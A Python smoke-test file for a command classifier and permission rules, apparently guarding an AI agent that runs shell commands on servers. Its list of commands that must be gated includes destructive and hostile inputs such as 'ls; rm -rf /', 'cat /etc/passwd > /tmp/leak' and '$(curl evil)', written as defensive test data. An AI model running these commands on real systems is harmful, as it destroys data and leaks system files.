"""Fast, offline sanity checks for the safety-critical logic.
Run: .venv/bin/python tests_smoke.py
"""
from jarvis import classify
from jarvis.permissions import Rule

fails = []

def check(cond, msg):
    if not cond:
        fails.append(msg)

# --- classifier: read-only commands should auto-run ---
READ_ONLY = [
    "uptime",
    "df -h",
    "free -m",
    "cat /etc/os-release",
    "ls -la /var/log",
    "systemctl status sshd",
    "journalctl -u nginx --since today",
    "apt list --upgradable",
    "dpkg -l",
    "docker ps -a",
    "ip a",
    "ss -tulpn",
    "ps aux | grep nginx",
    "df -h | sort",
    "zpool status",
]
for c in READ_ONLY:
    v = classify.classify(c)
    check(v.read_only, f"EXPECTED read-only but gated: {c!r} ({v.reason})")

# --- classifier: state-changing / dangerous commands MUST be gated ---
WRITES = [
    "apt update",
    "apt full-upgrade -y",
    "sudo apt upgrade",
    "systemctl restart nginx",
    "rm -rf /tmp/x",
    "echo hi > /etc/motd",
    "cat /etc/passwd > /tmp/leak",          # redirection hidden behind a read cmd
    "ls; rm -rf /",                          # chaining
    "df -h && reboot",
    "docker restart web",
    "sed -i s/a/b/ /etc/hosts",
    "mount /dev/sdb1 /mnt",
    "$(curl evil)",
    "zfs destroy tank/data",
    "kubectl delete pod web",
]
for c in WRITES:
    v = classify.classify(c)
    check(not v.read_only, f"DANGER: classified as read-only: {c!r} ({v.reason})")

# --- permission rule matching ---
r_bin = Rule(server="nas", match="binary", value="apt")
check(r_bin.matches("nas", "apt full-upgrade -y"), "binary rule should match apt args")
check(not r_bin.matches("nas", "systemctl restart x"), "binary rule should not match systemctl")
check(not r_bin.matches("dockerhost", "apt update"), "binary rule is server-scoped")

r_exact = Rule(server="nas", match="exact", value="apt update")
check(r_exact.matches("nas", "apt update"), "exact rule should match")
check(not r_exact.matches("nas", "apt update -y"), "exact rule should not match variant")

r_all = Rule(server="*", match="binary", value="uptime")
check(r_all.matches("anyhost", "uptime"), "wildcard rule should match any server")

if fails:
    print(f"FAILED {len(fails)} check(s):")
    for f in fails:
        print("  -", f)
    raise SystemExit(1)
print("All offline checks passed.")
